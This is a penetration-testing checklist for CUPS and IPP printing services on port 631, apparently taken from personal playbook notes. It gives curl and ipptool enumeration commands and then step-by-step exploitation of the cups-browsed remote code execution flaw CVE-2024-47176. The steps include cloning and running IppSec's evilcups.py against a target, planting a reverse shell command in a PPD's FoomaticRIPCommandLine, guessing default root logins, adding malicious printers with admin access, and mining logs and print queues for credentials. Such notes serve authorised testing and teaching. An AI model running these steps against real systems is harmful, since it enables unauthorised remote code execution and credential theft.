# CUPS and IPP enumeration

## Before I start
- [ ] 631/tcp in the scan, for IPP and the web pages, or 631/udp, for cups-browsed

## What it shows
curl -s http://<TargetIP>:631/ | head
curl -s http://<TargetIP>:631/printers/
curl -s http://<TargetIP>:631/jobs/
- [ ] Printer names, queued documents, usernames and versions from the web pages, even where the admin pages ask for a login
ipptool, after sudo apt install -y cups-ipp-utils:
ipptool -tv ipp://<TargetIP>:631/ get-printer-attributes.test

## cups-browsed RCE, CVE-2024-47176
- [ ] A host not patched since September 2024, with cups-browsed listening on 631/udp
IppSec's evilcups.py, from https://github.com/IppSec/evil-cups, in a virtual environment of its own:
git clone https://github.com/IppSec/evil-cups
python3 -m venv evil-cups/venv
evil-cups/venv/bin/pip install -r evil-cups/requirements.txt
evil-cups/venv/bin/python evil-cups/evilcups.py <LHOST> <TargetIP> 'THE-COMMAND'
- [ ] One UDP packet registers my IPP server as a printer, and its PPD runs THE-COMMAND when anything prints to it
- [ ] The command sits in the PPD's FoomaticRIPCommandLine: one reverse shell line, from :Pb shells
- [ ] Nothing runs until a job prints: a test page from the web pages, if I can send one

## With a login
- [ ] Logins tried: root with root, root with the system's own password, and any member of the lpadmin group
- [ ] A printer added with a PPD of my own, its FoomaticRIPCommandLine or cupsFilter line set to my command: it runs when a job prints
- [ ] /admin/log/error_log, for paths and the odd credential

## If it fails
- [ ] 631 closed or filtered: printing is not exposed
- [ ] Patched since September 2024: cups-browsed no longer takes the packet, so only the PPD route with a login is left

## Next
- [ ] A shell as lp or the filter's user: :Pb linux-enum, :Pb sudo
- [ ] Documents from the queue, read for credentials: :Pb linux-creds
